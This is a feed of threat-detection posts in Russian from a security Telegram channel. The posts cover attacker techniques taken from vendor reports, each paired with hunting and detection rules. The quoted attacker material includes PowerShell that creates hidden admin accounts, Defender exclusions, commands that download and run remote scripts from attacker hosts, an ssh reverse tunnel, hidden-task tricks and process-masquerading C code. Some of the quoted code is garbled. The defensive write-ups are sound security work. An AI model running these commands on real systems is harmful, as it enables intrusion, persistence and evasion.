+ProviderName="Microsoft-Windows-Sysmon" and EventId=1 and Image endswith "chrome.exe" and CommandLine contains "--load-extension"
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Tue, 16 Dec 2025 21:46:38 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_305</guid></item><item><title>И, судя по отчёту, этот функционал запускается в цикле до тех пор, пока пользователь не согласится выдать привилегии</title><link>https://t.me/detectioneasy/304</link><description>И, судя по отчёту, этот функционал запускается в цикле до тех пор, пока пользователь не согласится выдать привилегии
+
+[Media: Фото]</description><pubDate>Mon, 15 Dec 2025 19:45:42 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_304</guid></item><item><title>В фишинговой кампании по распространению UDPGangster 🔫 злоумышленники использовали интересный способ закрепления в системе</title><link>https://t.me/detectioneasy/303</link><description>Всем привет! 💻✌️
+В фишинговой кампании по распространению UDPGangster 🔫 злоумышленники использовали интересный способ закрепления в системе
+👨‍💻 Как это работает?
+Атакующие часто используют директорию автозагрузки пользователя. Путь к ней задаётся в реестре:
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Startup
+Если изменить значение этого ключа — Windows начнёт запускать программы уже из нового пути, что позволяет скрытно выполнять бинарь при старте системы
+🔭 Обнаружение:
+🔤 отслеживаем изменения ключа реестра HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Startup
+p.s. можем похантить, найдется что-то интересное...
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Sat, 06 Dec 2025 20:11:20 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_303</guid></item><item><title>Коллеги из ЛК поделились TTP хактивистских группировок 4BID, BO Team и Red Likho</title><link>https://t.me/detectioneasy/302</link><description>Всем привет! 💻✌️
+Коллеги из ЛК поделились TTP хактивистских группировок 4BID, BO Team и Red Likho
+Для подготовки инфраструктуры к уничтожению запускался ps1-скрипт, одна из возможностей которого создание локального пользователя с параметрами PasswordExpires, Disabled = FALSE и добавление его в группу локальных администраторов
+$userName = "[REDACTED]"
+$password = "[REDACTED]"
+$domain = "."
+$userExists = net user $userName 2&gt;$null
+$addUser = net user $userName $password /add
+wmic useraccount where "name='$userName'" set PasswordExpires=FALSE | Write-Log
+wmic useraccount where "name='$userName'" set Disabled=FALSE | Write-Log
+$group = (Get-LocalGroup -SID "S-1-5-32-544").Name
+net localgroup $group $userName /add | Write-Log
+Далее, хост настраивается для автоматического входа с созданным пользователем
+Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "AutoAdminLogon" -Value "1" | Write-Log
+Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultUserName" -Value $userName | Write-Log
+Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultPassword" -Value $password | Write-Log
+Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultDomainName" -Value $domain | Write-Log
+Второй индикатор подготовки к уничтожению — перевод системы в безопасный режим с сетью:
+cmd.exe /Q /c bcdedit /set {current} safeboot network &amp;&amp; shutdown -r -f -t 0 1&gt; \Windows\Temp\WsMeHC 2&gt;&amp;1
+🔭 Обнаружение:
+🔤 мониторинг создания локальных пользователей и их добавления в группу администраторов
+🔤 хантим ключи реестра SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+🔤 отслеживаем запуск bcdedit /set {current} safeboot network
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Wed, 03 Dec 2025 18:52:16 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_302</guid></item><item><title>Распространение вредоносов через USB-накопители остается актуальным способом. Цепочка заражения описана в отчете AhnLab и Google</title><link>https://t.me/detectioneasy/300</link><description>Всем привет! 💻✌️
+Распространение вредоносов через USB-накопители остается актуальным способом. Цепочка заражения описана в отчете AhnLab и Google
+👨‍💻 Как это работает?
+🔤На USB-накопители размещается ярлык USB Drive.lnk и скрытые папки sysvolume и USB Drive
+🔤LNK стартует VBS-скрипт из папки sysvolume (с именем вида u[6 цифр].vbs), который в свою очередь запускает BAT-файл с аналогичным именем из той же директории
+🔤BAT открывает для пользователя директорию USB Drive, в которой хранятся оригинальные файлы. Далее, проверяется наличие dat-файла в текущей директории, и файла C:\Windows&lt;SPACE&gt;\System32\printui.dll. Обращаем внимание на наличие пробела в пути Windows&lt;SPACE&gt;
+🔤Если C:\Windows&lt;SPACE&gt;\System32\printui.dll - отсутствует, то:
+🔤 в Windows Defender добавляется исключение C:\Windows&lt;SPACE&gt;\System32
+🔤 копирует легитимный C:\Windows\System32\printui.exe  в C:\Windows&lt;SPACE&gt;\System32
+🔤 копируется DAT-файл с USB-носителя  в C:\Windows&lt;SPACE&gt;\System32\printui.dll
+🔤 запускается C:\Windows&lt;SPACE&gt;\System32\printui.exe, который загрузит C:\Windows&lt;SPACE&gt;\System32\printui.dll
+🔤 вредоносная DLL регистрируется в службу DcomLaunch, запускает майнер XMRig в %SystemDirectory%\wsvcz и заражает другие съемные накопители
+🔭 Обнаружение:
+🔤 отслеживаем запуск опасных расширений со съемных накопителей
+🔤 отслеживаем запуск и создание файлов по маске \w?[0-9]{6}\.(vbs|dll|dat|bat)
+🔤 отслеживаем загрузку в память ImageLoaded = "*\printui.dll" and Signed="false"
+🔤 отслеживаем создание исключений в Windows Defender
+🔤 отслеживаем наличие пробелов в путях файлов \s\\
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Tue, 02 Dec 2025 10:49:23 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_300</guid></item><item><title>Nextron Systems поделились TTP группировки Silver Fox</title><link>https://t.me/detectioneasy/299</link><description>Всем привет! 💻✌️
+Nextron Systems поделились TTP группировки Silver Fox
+Хакеры распространяли вредоносный инсталятор Telegram Desktop для установки ValleyRat, по средствам фишинга и рекламы
+Судя по картинке, применяется огромная цепочка процедур из 14 шагов
+👨‍💻 Посмотрим TTP:
+🔤Жертва запускает вредоносный инсталлятор Telegram
+🔤Малварь создает исключение в Windows Defender
+🔤В C:\ProgramData\WindowsData дропается защищенный паролем архив и переименованный двоичный файл 7-Zip
+🔤 Из архива извлекается исполняемый файл второго этапа men.exe (основной оркестратор) и настоящий инсталлятор Telegram
+🔤 В %public%\WindowsData\ вредоносный men.exe создает ряд бинарей: для bypass uac, уязвимый драйвер Nvidia для EDR Silencer,  vbe-файл для закрепа в задачи (WindowsPowerShell.WbemScripting.SWbemLocator) и еще один архив
+🔤Файлы последнего архива извлекаются в %public%\WindowsData\, и содержат уязвимый к dll sideloading исполняемый файл для запуска ValleyRat
+men.exe изменяет список управления доступом для %PUBLIC%\Documents\WindowsData\, чтобы администраторы не могли  удалять файлы и каталоги по этому пути.
+🔭 Для обнаружения nextron предложили несколько своих вариантов с sigma-правилами:
+🔤 создание файлов в C:\ProgramData\WindowsData\
+🔤 добавление диска C: в исключение Windows Defender
+🔤 обнаружение запуска 7-Zip для извлечения защищенного архива
+title: Password Protected Compressed File Extraction Via 7-Zip
+description: Detects usage of 7zip utilities (7z.exe, 7za.exe and
+7zr.exe) to extract password protected zip files.
+logsource:
+category: process_creation
+product: windows
+detection:
+selection_img:
+- Description|contains: '7-Zip'
+- OriginalFileName:
+- '7za.exe'
+selection_password:
+CommandLine|contains|all:
+- ' -p'
+- ' x '
+- ' -o'
+- ' -y'
+condition: all of selection_*
+🔤 создание и запуск подозрительных файлов exe,dll,sys,vbe в/из директории %PUBLIC%
+🔤 создание задачи с исполняемым файлом в директории %PUBLIC%
+title: Scheduled Task Creation With Command In Users Public Directory
+description: Detects creation of a scheduled task whose action command
+points to \Users\Public
+detection:
+selection:
+EventID: 4698
+TaskContent|contains:
+- '\\Users\\Public\\'
+- '\\\\Users\\\\Public\\\\'
+condition: selection
+🔤 создание службы с исполняемым файлом в директории %PUBLIC%
+title: Service Creation In Users Public Directory
+description: Detects creation of a service running from \Users\Public
+detection:
+selection:
+EventID: 4697
+ServiceFileName|contains:
+- '\\Users\\Public\\'
+- '\\\\Users\\\\Public\\\\'
+condition: selection
+следим за ключами реестра HKLM\SYSTEM\CurrentControlSet\Services\
+🔤 изменение прав доступа на файлы и директории в %PUBLIC%
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Фото]</description><pubDate>Mon, 01 Dec 2025 08:45:03 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_299</guid></item><item><title>Группировка Bloody Wolf использует jar-файлы в фишинговых кампаниях в Центральной Азии</title><link>https://t.me/detectioneasy/298</link><description>Всем привет! 💻✌️
+Группировка Bloody Wolf использует jar-файлы в фишинговых кампаниях в Центральной Азии
+👨‍💻 Посмотрим TTP:
+🔤Жертва получает вредоносное письмо с PDF-приманкой, оформление которой имитирует документы Министерства юстиции
+🔤Пользователь открывает PDF и ему предлагается перейти по ссылке для загрузки материалов
+🔤Перейдя по ссылке пользователь загружает вредоносный JAR-файл, цель которого - установка NetSupport RAT
+🔤Для закрепа в JAR-файле предусмотрены 3 варианта:
+bat в %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+@echo off
+cd /d "C:\Users\Bruno\Documents\[Something]"
+start "" "[net support executable].exe"
+автозапуск в реестре
+cmd.exe /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v [something] /t REG_SZ /d "[path to net support executable]"
+создание задачи
+cmd.exe /c schtasks /TN "[Something]" /TR "[path to netsupport executable]" /SC ONLOGON /RL LIMITED /F /RU "%USERNAME%"
+Видим, что используется нестареющая классика)
+🔭 Обнаружение:
+🔤 следим за запуском javaw.exe c jar-файлами из пользовательских директорий
+javaw.exe -jar C:\Users\Administrator\Downloads
+Ndec0d327c39044523564721608ab551fffeae7af144b9657c367cd47aeb16a7a
+\dec0d327c39044523564721608ab551fffeae7af144b9657c367cd47aeb16a7a.jar
+🔤 отслеживаем запуск дочерних процессов от родителя javaw.exe
+🔤 можем похантить jar-файлы, у которых есть ADS - Zone.Identifier
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Sat, 29 Nov 2025 19:57:21 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_298</guid></item><item><title>Разберём интересную технику загрузки кода в память explorer.exe</title><link>https://t.me/detectioneasy/297</link><description>Всем привет! 💻✌️
+Разберём интересную технику загрузки кода в память explorer.exe
+Атакующие могут злоупотреблять функционалом изменения иконок для директорий. Иконки хранятся в DLL, и если в DLL есть функция DllMain, то при выборе изображения код из этой функции будет выполнен.
+🔭 Обнаружение:
+🔤 Обнаружение может быть достаточно шумным. Рекомендуется отслеживать загрузку любых библиотек из директорий пользователя. Правило можно улучшить, добавив корреляцию со временем создания загружаемого файла
+ProviderName="Microsoft-Windows-Sysmon" and EventId=7
+and Image endswith "explorer.exe"
+and ImageLoaded startswith "C:\Users\" and Signed="false"
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Fri, 28 Nov 2025 18:47:34 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_297</guid></item><item><title>Давайте разберем способы обхода обнаружения, которые применялись в фишинговой кампании</title><link>https://t.me/detectioneasy/296</link><description>Всем привет! 💻✌️
+Давайте разберем способы обхода обнаружения, которые применялись в фишинговой кампании
+👨‍💻 Посмотрим TTP:
+🔤Атака начинается с ClickFix (имитируется обновление системы: синий экран с процентами - всё привычно), в результате чего запускается удалённый скрипт через mshta.exe
+🔤Приложение hta запускает powershell.exe с командлетами iex (irm https://example.com/asf)
+🔤Теперь самое интересное. Скачанный ps1 начинает свою работу с повышения привилегий (UAC) и добавления исключений в Windows Defender
+$uQVLE622ThHArk = "Add-MpPreference -ExclusionPath 'C:\Windows\Temp'"
+$uQVLE622ThHArk +=
+"; Add-MpPreference -ExclusionPath '$env:WINDIR"
+$uQVLE622ThHArk +=
+; Add-MpPreference -ExclusionPath '$env: TEMP"
+$uQVLE622ThHArk +=
+Add-MpPreference -ExclusionPath '$env: USERPROFILE"
+$uQVLE622ThHArk +=
+Add-MpPreference -ExclusionPath '$env:APPDATA"
+$uQVLE622ThHArk += ";
+Add-MpPreference -ExclusionPath '$env: LOCALAPPDATA"
+$uQVLE622ThHArk += "; Add-MpPreference -ExclusionIpAddress '178.16.55.189', '94.154.35. 25'
+🔤Для повышения привилегий атакующие запускают powershell.exe с аргументом -Verb RunAs
+$aXNXjSqHUpLoYk = Start-Process powershell.exe
+-ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass - Command
+`$ErrorActionPreference='Stop'; $uQVLE622ThHArk" `
+-Verb RunAs `
+-﻿PassThru
+И, судя по отчёту, этот функционал запускается в цикле до тех пор, пока пользователь не согласится выдать привилегии
+🔤Последним этапом идёт установка RAT или стилера
+🔭 Обнаружение:
+🔤 отслеживаем аргументы powershell Add-MpPreference, Set-MpPreference, -Exclusion*
+🔤 отслеживаем создание новых значений в ключах реестра HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\
+🔤 отслеживаем события
+ProviderName = "Microsoft-Windows-Windows Defender/Operational" AND EventId=5007 AND NewValue contains "Microsoft\Windows Defender\Exclusions"
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Thu, 27 Nov 2025 19:55:25 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_296</guid></item><item><title>PT выпустили описание техник APT31, которые активно используют скрытые задачи планировщика Windows</title><link>https://t.me/detectioneasy/295</link><description>Всем привет! 💻✌️
+PT выпустили описание техник APT31, которые активно используют скрытые задачи планировщика Windows
+Для создания скрытой задачи необходимо удалить файл XML и ключ реестра SD (SecurityDescriptor) соответствующей задачи:
+reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TEST_TASK" /v SD /f
+del %SystemRoot%\System32\Tasks\TEST_TASK /f
+🔭 Обнаружение :
+🔤 следим за удалением ключей реестра
+ProviderName="Microsoft-Windows-Sysmon" and EventId = 12 and EventType = "DeleteValue" and TargetObject = "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*\SD"
+p.s. следует проверить конфиги средств сбора событий и DACL на куст реестра
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Wed, 26 Nov 2025 13:54:16 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_295</guid></item><item><title>Коллеги из PT рассказали про фишинговую кампанию NetMedved, цель которой - установить NetSupport Manager, в прошлый раз мы рассмотрели LNK-файл, сегодня давайте остановимся на NetSupport Manager</title><link>https://t.me/detectioneasy/294</link><description>Всем привет! 💻✌️
+Коллеги из PT рассказали про фишинговую кампанию NetMedved, цель которой - установить NetSupport Manager, в прошлый раз мы рассмотрели LNK-файл, сегодня давайте остановимся на NetSupport Manager
+🔭 Обнаружение:
+🔤 для работы создается служба Client32 с файлом *\NetSupport\NetSupport Manager\client32.exe
+🔤 отслеживаем создание процессов с метаданными
+Product: NetSupport Remote Control
+Company: NetSupport Ltd
+🔤 можем похантить файлы NSM.LIC и NSM.ini
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Mon, 24 Nov 2025 20:16:27 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_294</guid></item><item><title>Коллеги из PT рассказали про фишинговую кампанию NetMedved, цель которой - установить NetSupport Manager</title><link>https://t.me/detectioneasy/293</link><description>Всем привет! 💻✌️
+Коллеги из PT рассказали про фишинговую кампанию NetMedved, цель которой - установить NetSupport Manager
+👨‍💻 Разберём интересный момент: в LNK вынесены проверки на выполнение в песочнице. Обычно такие проверки встречаются на 2–3 этапе, но здесь они — сразу в LNK.
+🔤 жертвам рассылаются письма с вложенными архивами
+🔤 в архиве находятся: LNK, DOCX и PDF — документы маскируются под деловую переписку российских компаний.
+🔤LNK файл выполняет проверки на antisandbox:
+проверка процессов для анализа программ
+Get-Process | Where-Object {$_Name -match 'filemon|regmon|procexp|procexp64|t cpview|tcpview64|Procmon|Procmon64|vmmap|vmmap64|portmon|processlasso|Wireshark|Fiddler|ida|ida64|ImmunityDebugger|WinDump|x64dbg|x32dbg|OllyDbg|ProcessHacker'})
+проверка логических процессоров
+((Get-CimInstance Win32_Processor).NumberOfLogicalProcessors -lt 2)
+проверка разрешения экрана
+([System.Windows.Forms.Screen]:PrimaryScreen.Bounds.Width -lt 800) -or ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height  -lt 600))
+🔤 Если проверки пройдены успешно, то создается ps1-файл в LocalAppData с именем сгенерированного GUID
+$etdvmovzr = (Get-Item Env:LocalAppData).Value+\'+([guid]:NewGuid())+'.pS1';
+🔤с удаленного ресурса загружается ps1-нагрузка и записывается в созданный GUID-файл. Запуск скрипта
+irm 'metrics-strange.com/c626b76039054fe7899.ps1' &gt; $etdvmovzr;saps 'powershell' -ArgumentList ('-NoProfile"'-ep"'bypass"."-WindO'HIDD':-File' $etdvmovzr); exit O }"
+🔭 Обнаружение:
+🔤 отслеживаем создание LNK-файлов в %temp%
+ProviderName="Microsoft-Windows-Sysmon" and EventId = 11 and TargetFilename contains "\AppData\Local\Temp\" and TargetFilename endswith ".lnk"
+🔤 отслеживаем аргументы powershell PrimaryScreen.Bounds.Width, PrimaryScreen.Bounds.Height,  'filemon|regmon|procexp|procexp64|tcpview|tcpview64|Procmon|Procmon64|vmmap|vmmap64|portmon|processlasso|Wireshark|Fiddler|ida|ida64|ImmunityDebugger|WinDump|x64dbg|x32dbg|OllyDbg|ProcessHacker'
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Sun, 23 Nov 2025 10:09:22 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_293</guid></item><item><title>Обнаружена уязвимость CVE-2025-11001 в 7-Zip, позволяющая записывать файлы в произвольные места системы при распаковке архивов. Активно используется в фишинговых кампаниях</title><link>https://t.me/detectioneasy/292</link><description>Всем привет! 💻✌️
+Обнаружена уязвимость CVE-2025-11001 в 7-Zip, позволяющая записывать файлы в произвольные места системы при распаковке архивов. Активно используется в фишинговых кампаниях
+👨‍💻 Давайте посмотрим как работает:
+🔤Злоумышленник создает специальный архив с символической ссылкой
+🔤При распаковке 7-Zip создает ссылку на произвольную директорию (например, C:\Windows\System32)
+🔤Файлы из архива записываются по пути ссылки, а не в папку архива (все файлы расположенные в папке с именем симлинка)
+🔤Пользователь увидит остальные файлы (не расположенные в папке с именем симлинка)
+🔭 Обнаружение:
+🔤 обнаруживаем создание файлов процессом 7z*.exe, в подозрительных путях C:\Windows\, С:\Users\*\AppData\, C:\Program Files*\ и с опасными расширениями
+🔤 анализируем несоответствие путей, отслеживаем создание файлов с разными путями одним процессом 7z*.exe
+Можем брать,например, второй элемент списка из путей и сравнивать их
+p.s. оба правила будут фолсить, дополнительно можем проверять, что у архива есть ADS с ZoneId, и если проведена инвентаризация - версию 7z
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Фото]</description><pubDate>Thu, 20 Nov 2025 12:58:49 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_292</guid></item><item><title>У The DFIR Report вышел новый отчет по кампании Lynx Ransomware</title><link>https://t.me/detectioneasy/291</link><description>Всем привет! 💻✌️
+У The DFIR Report вышел новый отчет по кампании Lynx Ransomware
+👨‍💻 Как это работает?
+🔤Атака начинается со входа по RDP, при этом нет признаков брутфорса — злоумышленники используют уже валидные учётные данные
+🔤Через несколько минут после получения доступа атакующие авторизовались на контроллере домена, используя учетную запись администратора
+🔤Для закрепа создали несколько учетных записей и добавили их в админы домена
+🔤Злоумышленники провели разведку сети: обнаружили виртуализацию и сетевые шары
+🔤Чувствительные файлы были упакованы в архивы через 7-Zip и загружены на temp.sh
+🔤На серверах резервного копирования были удалены задания бекапов и запущен Lynx Ransomware
+Отдельно стоит отметить использование SoftPerfect Network Scanner
+🔭 Обнаружение и хантинг:
+🔤 добавление новых пользователей в привилегированные группы
+🔤 создание учеток с атрибутом USER_DONT_EXPIRE_PASSWORD
+🔤 создание файла netscan* - можем похантить в mft и usn
+🔤 авторизации с белых адресов, LogonType 10 и 3
+🔤 для YARA можем использовать строку из лицензионного файла SoftPerfect Network Scanner - network-scanner-license
+🔤 обнаружение файлов с именем delete.me, которые NetScan создает при проверке записи в сетевых шарах. можем похантить в mft и usn
+🔤запуск процесса с метаданными
+Product: Network Scanner
+Description: Application for scanning networks
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Wed, 19 Nov 2025 05:31:46 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_291</guid></item><item><title>Давайте познакомимся с отчетом коллег из Esentire</title><link>https://t.me/detectioneasy/290</link><description>Всем привет! 💻✌️
+Давайте познакомимся с отчетом коллег из Esentire
+👨‍💻 Как это работает?
+ClickFix используется для доставки двух нагрузок: NetSupport Manager и Amatera Stealer
+🔤Для доставки используется ClickFix, цель которого установить RMM - NetSupport Manager и Amatera Stealer
+🔤В качестве нагрузки ClickFix используется mshta.exe, который запускает цепочку powershell-скриптов:
+powershell.exe -nopROfi -ExEC UnRESTrictED -WINDOWSTYI HiD -ENc &lt;BASE64&gt;
+powershell.exe -ENC &lt;BASE64&gt;
+powershell.exe -NoProfile -ExecutionPolicy Unrestricted -WindowStyle Hidden -Command &lt;COMMAND&gt;
+Исследователи отмечают использование строки AMSI_RESULT_NOT_DETECTED как ключа для bxor и последующую перезапись функции AmsiScanBuffer.
+🔤Результат цепочки скриптов - запуск .NET-based Downloader, который загружает, расшифровывает и запускает нагрузку с MediaFire
+🔤Перед установкой NetSupport проверяется, принадлежит ли компьютер к домену, и есть ли на нем интересные файлы
+🔭 Обнаружение и хантинг:
+🔤 отслеживаем резолв mediafire.com
+🔤 отслеживаем командлеты и строки в Powershell GetMappedFileName, clr.dll, ReadProcessMemory, PAGE_EXECUTE_READWRITE, WriteProcessMemory, AMSI_RESULT_NOT_DETECTED
+🔤 поиск белых адресов в командлетах powershell
+🔤 создание подозрительных ключей в HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Фото]</description><pubDate>Tue, 18 Nov 2025 04:29:07 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_290</guid></item><item><title>Давайте рассмотрим технику, которой атакующие часто пользуются для подмены поведения процессов и сокрытия активности — LD_PRELOAD</title><link>https://t.me/detectioneasy/289</link><description>Всем привет! 💻✌️
+Давайте рассмотрим технику, которой атакующие часто пользуются для подмены поведения процессов и сокрытия активности — LD_PRELOAD
+В этом отчете хакеры модифицировали поведение юнита systemd - rsyslog.service
+👨‍💻 Как это работает?
+Systemd читает unit-файлы и drop-in-файлы из стандартных директорий, например:
+🔤/etc/systemd/system/*
+🔤/lib/systemd/system/*
+🔤/run/systemd/system/*
+🔤/usr/lib/systemd/system/*
+🔤~/.config/systemd/user/*
+Атакующие создали папку unintname.d - rsyslog.service.d, и файл с расширением .conf
+[Service]
+Environment='LD_PRELOAD=libnsan.so'
+🔭 Обнаружение:
+🔤 одним из способов для хантинга можно проверить содержимое /proc/*/environ
+grep -ai "LD_PRELOAD" /proc/*/environ
+🔤 можем увидеть путь к подозрительным библиотекам в /proc/PID/maps
+7f161cc04000-7f161cc05000 r--p 00000000 fe:01 31256 /usr/lib/systemd/system/rsyslog.service.d/libnsan.so
+7f161cc05000-7f161cc06000 r-xp 00001000 fe:01 31256 /usr/lib/systemd/system/rsyslog.service.d/libnsan.so
+7f161cc06000-7f161cc07000 r--p 00002000 fe:01 31256 /usr/lib/systemd/system/rsyslog.service.d/libnsan.so
+7f161cc07000-7f161cc08000 r--p 00002000 fe:01 31256 /usr/lib/systemd/system/rsyslog.service.d/libnsan.so
+7f161cc08000-7f161cc09000 rw-p 00003000 fe:01 31256 /usr/lib/systemd/system/rsyslog.service.d/libnsan.so
+🔤 похантить наличие переменной LD_PRELOAD в /etc/profile, /etc/profile.d/*, /etc/environment, ~/.*rc, ~/.profile
+p.s. отличная статья про поиск ld_preload
+#dfir@detectioneasy
+#ttp@detectioneasy</description><pubDate>Sat, 08 Nov 2025 15:23:03 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_289</guid></item><item><title>Продолжим знакомство с техниками сокрытия процессов - пример можно найти в отчете, а описание метода тут</title><link>https://t.me/detectioneasy/288</link><description>Всем привет! 💻✌️
+Продолжим знакомство с техниками сокрытия процессов - пример можно найти в отчете, а описание метода тут
+👨‍💻 Атакующие могут спрятать вредоносный процесс, выполнив bind монтирование:
+mount --bind /proc/&lt;легитимный_PID&gt; /proc/&lt;вредоносный_PID&gt;
+После этого ps, ls /proc и другие утилиты не будут показывать вредоносный процесс
+Давайте запустим вредоносный процесс ping localhost
+root        8765  0.1  0.4  14408  8604 ?        Ss   18:20   0:00  \_ sshd: root@pts/2
+root        8771  0.5  0.3  13364  7204 pts/2    Ss   18:20   0:00      \_ -zsh
+root        8963  0.0  0.1   7340  2532 pts/2    SN   18:21   0:00          \_ ping localhost
+Его PID - 8963
+Создадим директорию /tmp/hidden и примонтируем ее в /proc/8963
+mount --bind /tmp/hidden /proc/8963
+В результате выполнения ps -auxfww мы не увидим PID нашего процесса
+root        8765  0.0  0.4  14408  8704 ?        Ss   18:20   0:00  \_ sshd: root@pts/2
+root        8771  0.5  0.3  13708  7792 pts/2    Ss   18:20   0:01      \_ -zsh
+root        9159  0.0  0.1   9908  3240 pts/2    R+   18:24   0:00          \_ ps -auxfww
+🔭 Для обнаружения:
+🔤 можем проверить вывод mount | grep /proc
+/dev/vda1 on /proc/8963 type ext4 (rw,relatime,errors=remount-ro)
+🔤 еще одним тригером может быть отсутствие структуры директорий /proc/PID. В моем случае директория пустая
+Можем ли мы смонтировать структуру другого процесса, например dockerd? 🧐
+Проверим что, там действительно dockerd
+# readlink /proc/469/exe
+/usr/bin/dockerd
+Выполним монтирование
+mount --bind /proc/469 /proc/8963
+Проверим вывод ps -auxfww
+root         469  0.0  3.8 1897816 76868 ?       Ssl  Oct22   3:34 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root         469  0.0  3.8 1897816 76868 ?       Ssl  Oct22   3:34 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+Теперь у нас два процесса с одинаковым PID - 469
+🔤 можем использовать для охоты наличие одинаковых PID, но в выводе mount следы также остаются
+#dfir@detectioneasy
+#ttp@detectioneasy</description><pubDate>Fri, 31 Oct 2025 18:51:06 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_288</guid></item><item><title>Атакующие часто маскируют вредоносы под легитимные системные процессы, подменяя своё отображаемое имя через argv[0]</title><link>https://t.me/detectioneasy/287</link><description>Всем привет! 💻✌️
+Атакующие часто маскируют вредоносы под легитимные системные процессы, подменяя своё отображаемое имя через argv[0]
+Пример можно найти в отчете
+👨‍💻 Как это может работать?
+🔤Процесс запускается как /tmp/.malware
+🔤При старте проверяет argv[0]
+🔤Если имя не совпадает с ожидаемым - перезапускает себя через execve с поддельным argv[0], например: /usr/lib/systemd/systemd-update
+В результате ps, top, htop отображают процесс как легитимный, скрывая его реальное расположение.
+💀 Простой пример:
+#define _GNU_SOURCE
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char *argv[], char *envp[]) {
+const char *fake = "/usr/lib/systemd/systemd-update";
+if (strcmp(argv[0], fake) != 0) {
+char *new_argv[] = { (char *)fake, NULL };
+execve("/proc/self/exe", new_argv, envp);
+}
+while(1) sleep(60);
+}
+argv[0] — это первый элемент массива, который передается при вызове функции execve
+Для проверки можно использовать скрипт:
+for pid in /proc/[0-9]*; do
+exe=$(readlink "$pid/exe" 2&gt;/dev/null)
+cmdline=$(tr '\0' ' ' &lt; "$pid/cmdline" 2&gt;/dev/null)
+if [[ -n "$exe" &amp;&amp; -n "$cmdline" ]]; then
+exe_name=$(basename "$exe")
+cmd_name=$(echo "$cmdline" | cut -d' ' -f1 | xargs basename 2&gt;/dev/null)
+if [[ "$exe_name" != "$cmd_name" ]]; then
+echo "SUSP: PID $(basename $pid) | exe=$exe | cmdline=$cmdline"
+fi
+fi
+done
+Если атакующие удалят файл, то в конце вывода readlink /proc/207349/exe  будет (deleted)
+#dfir@detectioneasy
+#ttp@detectioneasy</description><pubDate>Thu, 30 Oct 2025 09:57:41 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_287</guid></item><item><title>Давайте познакомимся с TTP атакующих, которые получают доступ эксплуатируя уязвимость в TrueConf</title><link>https://t.me/detectioneasy/286</link><description>Всем привет! 💻✌️
+Давайте познакомимся с TTP атакующих, которые получают доступ эксплуатируя уязвимость в TrueConf
+🔤Успешная эксплуатация уязвимости позволяет выполнить инъекцию аргументов в командную строку процесса C:\Program Files\TrueConf Server\httpconf\bin\tc_webmgr.exe
+Инъекция команды (успешная эксплуатация BDU:2025-10116, признак эксплуатации):
+cmd.exe /s /c "“C:\Program Files\TrueConf Server\tc_server.exe” /mode:1 /ServerID:a /ServerName:aaa1111#vcs /Serial:||powershell -c "..."|| /File:"D:\TrueConf\activation\offlinereg.vrg""
+🔤Атакующие закрепляются через создание локального пользователя (audit, audit1) и создание сервиса C:\Windows\System32\dfxhost.dll с именем SscpSvc
+🔤Создают ssh-туннель. Подключение идет на 443 порт сервера атакующих, позволяет пройти межсетевой без функций NGFW
+ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15 -f -N -R 39433 -p 443 ...@...
+🔭 Обнаружение:
+🔤 создание локальных пользователей
+🔤 наличие подозрительных строк в аргументах tc_webmgr.exe
+logsource:
+category: process_creation
+product: windows
+detection:
+selection_parent:
